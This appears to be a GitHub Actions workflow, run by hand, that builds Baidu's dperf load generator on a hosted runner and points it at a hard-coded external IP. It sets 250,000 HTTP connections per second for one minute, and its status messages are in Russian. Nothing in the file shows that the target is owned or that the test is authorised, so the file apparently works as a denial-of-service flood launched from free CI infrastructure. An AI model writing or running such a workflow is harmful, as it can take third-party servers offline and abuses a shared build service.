name: dperf
on: workflow_dispatch
jobs:
  dperf:
    runs-on: ubuntu-24.04-arm
    steps:
      - run: |
          git clone https://github.com/baidu/dperf.git
          cd dperf
          sudo apt-get update
          sudo apt-get install -y libdpdk-dev libsystemd-dev
          make
          cd build
          TARGET_IP="43.174.196.101"; TARGET_PORT="80"; \
          LOCAL_IP=$(ip route get $TARGET_IP | grep -oP 'src \K\S+'); \
          GW=$(ip -4 route get $TARGET_IP | grep -oP 'via \K\S+'); [ -z "$GW" ] && GW=$(ip -4 route show default | grep -oP 'via \K\S+' | head -n1); \
          PCI=$(ls /sys/bus/pci/drivers/mlx5_core/ 2>/dev/null | grep -E '^[0-9a-fA-F]{4}:' | head -n1); \[ -z "$PCI" ] && PCI=$(lspci -D 2>/dev/null | grep -i mellanox | awk '{print $1}' | head -n1); \
          cat <<EOF > client.conf
          mode client
          protocol http
          cpu 0 1 2 3
          rss
          duration 1m
          cps 250000
          port ${PCI:-ОШИБКА_НЕТ_PCI} $LOCAL_IP ${GW:-НЕТ_ШЛЮЗА}
          client $LOCAL_IP 200
          server $TARGET_IP 1
          listen $TARGET_PORT 1
          EOF
          echo "✅ Готово! Проверяем:"
          cat client.conf
          sudo sysctl -w vm.nr_hugepages=5120
          sudo mkdir -p /dev/hugepages
          sudo mount -t hugetlbfs nodev /dev/hugepages
          sudo ./dperf -c client.conf
